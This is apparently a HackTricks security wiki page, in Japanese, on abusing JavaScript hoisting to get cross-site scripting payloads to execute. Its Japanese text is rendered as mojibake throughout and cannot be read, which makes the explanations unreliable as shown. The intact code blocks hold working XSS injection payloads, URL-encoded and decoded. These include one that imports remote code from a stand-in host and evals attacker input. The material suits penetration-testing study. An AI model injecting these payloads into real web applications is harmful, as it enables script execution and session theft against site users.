# JS ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## åŸºæœ¬æƒ…å ±

JavaScriptè¨€èªã§ã¯ã€**ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ãŒã‚ã‚Šã€å¤‰æ•°ã€é–¢æ•°ã€ã‚¯ãƒ©ã‚¹ã€ã¾ãŸã¯ã‚¤ãƒ³ãƒãƒ¼ãƒˆã®å®£è¨€ãŒã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹å‰ã«æ¦‚å¿µçš„ã«ã‚¹ã‚³ãƒ¼ãƒ—ã®å…ˆé ­ã«ç§»å‹•ã™ã‚‹ã¨èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€JavaScriptã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦è‡ªå‹•çš„ã«å®Ÿè¡Œã•ã‚Œã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’è¤‡æ•°å›é€šéã—ã¾ã™ã€‚

æœ€åˆã®ãƒ‘ã‚¹ä¸­ã€ã‚¨ãƒ³ã‚¸ãƒ³ã¯æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€æŠ½è±¡æ§‹æ–‡æœ¨ã«å¤‰æ›ã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚§ãƒ¼ã‚ºã«ã¯ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ãŒå«ã¾ã‚Œã€ç‰¹å®šã®å®£è¨€ãŒå®Ÿè¡Œã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®å…ˆé ­ã«ç§»å‹•ã—ã¾ã™ã€‚æ§‹æ–‡è§£æãƒ•ã‚§ãƒ¼ã‚ºãŒæˆåŠŸã—ã€æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ãŒãªã„ã“ã¨ã‚’ç¤ºã™å ´åˆã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡ŒãŒç¶šè¡Œã•ã‚Œã¾ã™ã€‚

ä»¥ä¸‹ã®ç‚¹ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ï¼š

1. å®Ÿè¡ŒãŒç™ºç”Ÿã™ã‚‹ã«ã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ãŒãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ§‹æ–‡ãƒ«ãƒ¼ãƒ«ã«å³å¯†ã«å¾“ã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
2. ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã®ã‚³ãƒ¼ãƒ‰ã®é…ç½®ã¯ã€ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã«ã‚ˆã£ã¦å®Ÿè¡Œã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ãŒã€å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã¯ãã®ãƒ†ã‚­ã‚¹ãƒˆè¡¨ç¾ã¨ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

#### ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®ç¨®é¡

MDNã‹ã‚‰ã®æƒ…å ±ã«åŸºã¥ã„ã¦ã€JavaScriptã«ã¯4ã¤ã®ç•°ãªã‚‹ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®ç¨®é¡ãŒã‚ã‚Šã¾ã™ï¼š

1. **å€¤ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ï¼šå¤‰æ•°ã®å€¤ã‚’å®£è¨€è¡Œã®å‰ã«ã‚¹ã‚³ãƒ¼ãƒ—å†…ã§ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
2. **å®£è¨€ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ï¼šå®£è¨€ã®å‰ã«å¤‰æ•°ã‚’å‚ç…§ã§ãã‚‹ã‚ˆã†ã«ã—ã€`ReferenceError`ã‚’å¼•ãèµ·ã“ã•ãšã«ã€ãŸã ã—å¤‰æ•°ã®å€¤ã¯`undefined`ã«ãªã‚Šã¾ã™ã€‚
3. ã“ã®ã‚¿ã‚¤ãƒ—ã¯ã€å®£è¨€ã®å‰ã«å¤‰æ•°ã®å®£è¨€ãŒã‚ã‚‹ãŸã‚ã€ã‚¹ã‚³ãƒ¼ãƒ—å†…ã§ã®å‹•ä½œãŒå¤‰ã‚ã‚Šã¾ã™ã€‚
4. å®£è¨€ã®å‰¯ä½œç”¨ã¯ã€ãã‚Œã‚’å«ã‚€ã‚³ãƒ¼ãƒ‰ã®æ®‹ã‚ŠãŒè©•ä¾¡ã•ã‚Œã‚‹å‰ã«ç™ºç”Ÿã—ã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€é–¢æ•°å®£è¨€ã¯ã‚¿ã‚¤ãƒ—1ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°å‹•ä½œã‚’ç¤ºã—ã€`var`ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã¯ã‚¿ã‚¤ãƒ—2ã®å‹•ä½œã‚’ç¤ºã—ã¾ã™ã€‚`let`ã€`const`ã€`class`ã‚’å«ã‚€ãƒ¬ã‚­ã‚·ã‚«ãƒ«å®£è¨€ã¯ã€ã‚¿ã‚¤ãƒ—3ã®å‹•ä½œã‚’ç¤ºã—ã¾ã™ã€‚æœ€å¾Œã«ã€`import`ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã¯ã€ã‚¿ã‚¤ãƒ—1ã¨ã‚¿ã‚¤ãƒ—4ã®å‹•ä½œã®ä¸¡æ–¹ã§ãƒ›ã‚¤ã‚¹ãƒˆã•ã‚Œã¾ã™ã€‚

## ã‚·ãƒŠãƒªã‚ª

ã—ãŸãŒã£ã¦ã€**æœªå®£è¨€ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å¾Œã«JSã‚³ãƒ¼ãƒ‰ã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆ**ã™ã‚‹ã‚·ãƒŠãƒªã‚ªãŒã‚ã‚‹å ´åˆã€ãã‚Œã‚’å®£è¨€ã—ã¦ï¼ˆã‚¨ãƒ©ãƒ¼ã‚’ã‚¹ãƒ­ãƒ¼ã™ã‚‹ä»£ã‚ã‚Šã«ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ï¼‰**æ§‹æ–‡ã‚’ä¿®æ­£**ã§ãã¾ã™ã€‚
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## ã‚ˆã‚Šå¤šãã®ã‚·ãƒŠãƒªã‚ª
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## å‚è€ƒæ–‡çŒ®

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)** ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ ã§ **@carlospolopm** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks** ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
